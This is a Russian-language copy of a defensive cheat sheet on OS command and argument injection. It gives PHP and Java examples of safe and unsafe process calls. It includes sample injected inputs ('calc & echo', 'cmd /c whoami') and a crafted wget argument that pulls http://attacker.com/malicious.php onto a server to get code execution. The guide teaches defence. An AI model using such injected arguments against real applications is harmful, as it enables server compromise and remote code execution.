    OS Command Injection Defense Cheat Sheet¶

    Введение¶

    Внедрение команд (или OS Command Injection) — это тип инъекции, при котором программное обеспечение, формирующее системную команду с использованием внешних данных, не нейтрализует должным образом спецсимволы, способные изменить первоначально задуманную команду.

    Например, если переданное значение:

    calc

    вводится в командной строке Windows, отображается приложение Калькулятор.

    Однако если переданное значение было подделано и теперь выглядит так:

    calc & echo "test"

    при выполнении это изменяет смысл первоначальной команды.

    В результате отображается и приложение Калькулятор, и значение test:

    Проблема усугубляется, если скомпрометированный процесс не соблюдает принцип наименьших привилегий — тогда команды, управляемые злоумышленником, выполняются с повышенными системными привилегиями, увеличивая масштаб ущерба.

    Argument Injection¶

    Каждая атака OS Command Injection является также атакой Argument Injection. При этом типе атак пользовательский ввод может передаваться в качестве аргументов при выполнении определённой команды.

    Например, если пользовательский ввод пропускается через функцию экранирования, которая убирает такие символы, как &, |, ; и т.д.:

    system("curl " . escape($url));

    это предотвращает запуск злоумышленником других команд.

    Однако если строка, контролируемая злоумышленником, содержит дополнительный аргумент команды curl:

    system("curl " . escape("--help"))

    При выполнении этого кода будет выведен результат curl --help.

    В зависимости от используемой системной команды, последствия атаки Argument Injection могут варьироваться от раскрытия информации до критического удалённого выполнения кода.

    Основные меры защиты¶

    Вариант защиты 1: Избегайте прямых вызовов OS-команд¶

    Основная защита — не вызывать OS-команды напрямую. Встроенные функции библиотек являются хорошей альтернативой OS-командам, поскольку их нельзя заставить выполнять задачи, для которых они не предназначены.

    Например, используйте mkdir() вместо system("mkdir /dir_name").

    Если для используемого языка доступны библиотеки или API — это предпочтительный способ.

    Примеры см. в описании escapeshellarg() в PHP.

    Функция escapeshellarg() оборачивает пользовательский ввод в одинарные кавычки, поэтому если некорректный ввод выглядит как & echo "hello", итоговый результат будет вида calc '& echo "hello"', что будет интерпретировано как единственный аргумент команды calc.

    Несмотря на то что escapeshellarg() предотвращает OS Command Injection, злоумышленник всё равно может передать один аргумент команде.

    Вариант защиты 3: Параметризация в сочетании с валидацией входных данных¶

    Если избежать вызова системной команды, включающей пользовательские данные, невозможно, следует применять два следующих уровня защиты:

    Уровень 1¶

    Параметризация: По возможности используйте структурированные механизмы, автоматически обеспечивающие разделение данных и команды. Такие механизмы помогают корректно выполнять квотирование и кодирование.

    Уровень 2¶

    Валидация входных данных: Значения команд и соответствующих аргументов должны быть проверены. Существуют различные степени валидации для команды и её аргументов:

    • Используемые команды должны проверяться по списку разрешённых команд.
    • Аргументы для этих команд следует проверять с помощью следующих подходов:
      • Позитивная валидация (allowlist): явно определите допустимые аргументы.
      • Allowlist-регулярное выражение: определите список допустимых символов и максимальную длину строки. Убедитесь, что метасимволы, указанные в Примечании А, и пробельные символы не входят в регулярное выражение. Например, следующее регулярное выражение допускает только строчные буквы и цифры и не содержит метасимволов, а длина ограничена 3–10 символами: ^[a-z0-9]{3,10}$
    • Согласно Правилу 10 POSIX: Первый аргумент --, не являющийся аргументом опции, должен приниматься как разделитель, указывающий на конец опций. Все последующие аргументы должны трактоваться как операнды, даже если начинаются с символа -. Например, curl -- $url предотвращает argument injection, даже если $url содержит дополнительный аргумент.

    Примечание А:

    & |  ; $ > < ` \ ! ' " ( )

    Дополнительные меры защиты¶

    Помимо основных мер, параметризации и валидации входных данных, рекомендуется также применять все перечисленные ниже дополнительные меры для обеспечения глубокоэшелонированной защиты.

    Дополнительные меры:

    • Приложения должны запускаться с минимальными привилегиями, необходимыми для выполнения нужных задач.
    • По возможности создавайте изолированные учётные записи с ограниченными привилегиями, используемые только для одной задачи.

    Примеры кода¶

    Java¶

    В Java используйте ProcessBuilder — команда и её аргументы должны передаваться раздельно.

    Примечание о поведении метода Runtime.exec в Java:

    Многие ресурсы утверждают, что Runtime.exec в Java аналогичен функции system в языке C. Это не так. Оба позволяют запустить новый процесс/программу.

    Однако функция system в C передаёт аргументы оболочке (/bin/sh) для разбора, тогда как Runtime.exec пытается разбить строку на массив слов и выполняет первое слово с остальными словами в качестве параметров.

    Runtime.exec НЕ пытается вызвать оболочку и не поддерживает метасимволы оболочки.

    Ключевое различие состоит в том, что большинство возможностей оболочки, которые могут быть использованы в злонамеренных целях (объединение команд с помощью &, &&, |, || и т.д., перенаправление ввода и вывода), просто передадутся в виде параметра первой команде, скорее всего вызвав синтаксическую ошибку или будучи отброшенными как недопустимый параметр.

    Код для проверки вышесказанного:

    String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### ТЕСТОВАЯ КОМАНДА: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### ТЕСТ ТОЛЬКО PAYLOAD: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));

    Неправильное использование:

    ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");

    В этом примере команда вместе с аргументами передаётся в виде одной строки, что упрощает манипуляцию выражением и внедрение вредоносных строк.

    Правильное использование:

    Вот пример запуска процесса с изменённым рабочим каталогом. Команда и каждый из аргументов передаются отдельно. Это упрощает валидацию каждого элемента и снижает риск внедрения вредоносных строк.

    ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();

    PHP¶

    PHP предоставляет две вспомогательные функции для случаев, когда необходимо передать пользовательский ввод в оболочку: escapeshellarg() и escapeshellcmd().

    escapeshellarg(): Гарантирует, что пользователь может передать команде только один параметр, не добавляя лишних параметров и не выполняя другую команду.

    escapeshellcmd(): Гарантирует, что пользователь может выполнить только задуманную команду, допускает передачу неограниченного числа параметров, но не позволяет выполнять другие команды.

    При работе с пользовательским вводом всегда предпочтительнее использовать escapeshellarg(), а не escapeshellcmd().

    Например, рассмотрим код с использованием wget и escapeshellcmd():

    $url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));

    Если пользователь передаст:

    http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php

    escapeshellcmd() всё равно разрешит этот дополнительный параметр — это означает, что злоумышленник может переопределить исходную опцию --directory-prefix, сохранить файл в текущем каталоге и в итоге получить удалённое выполнение кода на сервере.

    Безопасный подход — использовать escapeshellarg(), чтобы URL обрабатывался как единственный аргумент:

    $url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);

    Тогда вредоносный ввод превращается в:

    wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'

    Здесь второй --directory-prefix является частью строки в кавычках, а не реальной опцией, поэтому атака не удаётся.

    Кроме того, рекомендуется придерживаться следующих правил безопасности:

    • Жёстко задавайте команду: никогда не позволяйте пользователю выбирать исполняемый файл.
    • Жёстко задавайте опции: обязательные флаги (например, --directory-prefix) должны быть в коде, а не в пользовательском вводе.
    • Максимально валидируйте и ограничивайте ввод: применяйте строгие правила валидации, allowlist-ы и проверки формата для минимизации поверхности атаки.
